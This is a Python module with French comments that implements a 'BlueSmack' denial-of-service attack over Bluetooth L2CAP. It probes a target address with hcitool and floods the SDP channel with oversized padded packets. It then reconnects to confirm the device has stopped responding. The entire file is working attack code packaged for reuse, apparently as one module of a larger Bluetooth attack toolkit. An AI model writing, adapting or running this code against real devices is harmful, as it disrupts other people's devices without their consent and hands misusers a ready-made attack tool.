#!/usr/bin/env python3
"""
Attaque BlueSmack - Déni de service L2CAP
"""

import subprocess
import time
import struct
import socket
import threading
from typing import Dict, Any, Optional
import os

class BlueSmackAttack:
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.running = False
        self.target_address = None
        self.callback = None
        
    def execute(self, target_address: str, callback=None, **kwargs) -> bool:
        """Exécuter l'attaque BlueSmack"""
        self.target_address = target_address
        self.callback = callback
        self.running = True
        
        try:
            self._log(f"Démarrage de l'attaque BlueSmack sur {target_address}")
            
            # Phase 1: Vérifier la connectivité
            if not self._check_connectivity(target_address):
                self._log("Cible non accessible", "error")
                return False
                
            # Phase 2: Envoyer des paquets L2CAP de grande taille
            if not self._send_large_l2cap_packets(target_address):
                self._log("Échec de l'envoi des paquets L2CAP", "error")
                return False
                
            # Phase 3: Vérifier l'effet de l'attaque
            if not self._verify_dos_effect(target_address):
                self._log("Effet DoS non confirmé", "warning")
                return False
                
            self._log("Attaque BlueSmack réussie!", "success")
            return True
            
        except Exception as e:
            self._log(f"Erreur lors de l'attaque BlueSmack: {e}", "error")
            return False
        finally:
            self.running = False
            
    def _check_connectivity(self, target_address: str) -> bool:
        """Vérifier la connectivité avec la cible"""
        try:
            self._log("Vérification de la connectivité...")
            
            # Utiliser hcitool pour vérifier la connectivité
            cmd = ['hcitool', 'info', target_address]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                self._log("Cible accessible", "info")
                return True
            else:
                self._log("Cible non accessible", "error")
                return False
                
        except Exception as e:
            self._log(f"Erreur lors de la vérification de connectivité: {e}", "error")
            return False
            
    def _send_large_l2cap_packets(self, target_address: str) -> bool:
        """Envoyer des paquets L2CAP de grande taille"""
        try:
            self._log("Envoi de paquets L2CAP de grande taille...")
            
            # Créer un socket L2CAP
            sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
            sock.settimeout(5)
            
            # Se connecter au port L2CAP 1 (SDP)
            sock.connect((target_address, 1))
            
            # Envoyer des paquets de grande taille
            packet_count = self.config.get('packet_count', 100)
            packet_size = self.config.get('packet_size', 600)
            
            for i in range(packet_count):
                if not self.running:
                    break
                    
                # Créer un paquet L2CAP de grande taille
                large_packet = self._create_large_l2cap_packet(packet_size)
                
                try:
                    sock.send(large_packet)
                    self._log(f"Paquet {i+1}/{packet_count} envoyé ({packet_size} octets)", "info")
                    
                    # Petit délai entre les paquets pour éviter la surcharge
                    import time
                    time.sleep(0.05)  # Réduit pour plus d'efficacité
                    
                except socket.error as e:
                    self._log(f"Erreur lors de l'envoi du paquet {i+1}: {e}", "warning")
                    break
                    
            sock.close()
            return True
            
        except Exception as e:
            self._log(f"Erreur lors de l'envoi des paquets L2CAP: {e}", "error")
            return False
            
    def _create_large_l2cap_packet(self, size: int) -> bytes:
        """Créer un paquet L2CAP de grande taille"""
        # Header L2CAP
        packet = struct.pack('<H', size - 4)  # Length (sans le header)
        packet += struct.pack('<H', 0x0001)   # CID (SDP)
        
        # Données de remplissage
        packet += b'A' * (size - 4)
        
        return packet
        
    def _verify_dos_effect(self, target_address: str) -> bool:
        """Vérifier l'effet de l'attaque DoS"""
        try:
            self._log("Vérification de l'effet DoS...")
            
            # Attendre un peu pour que l'effet se manifeste
            import time
            time.sleep(1)  # Réduit pour une vérification plus rapide
            
            # Essayer de se reconnecter pour vérifier si la cible répond
            try:
                sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
                sock.settimeout(3)
                sock.connect((target_address, 1))
                sock.close()
                
                self._log("Cible répond encore - DoS non confirmé", "warning")
                return False
                
            except socket.error:
                self._log("Cible ne répond plus - DoS confirmé!", "success")
                return True
                
        except Exception as e:
            self._log(f"Erreur lors de la vérification DoS: {e}", "error")
            return False
            
    def _log(self, message: str, level: str = "info"):
        """Logger un message"""
        if self.callback:
            self.callback(message, level)
        else:
            print(f"[{level.upper()}] {message}")
            
    def stop(self):
        """Arrêter l'attaque"""
        self.running = False
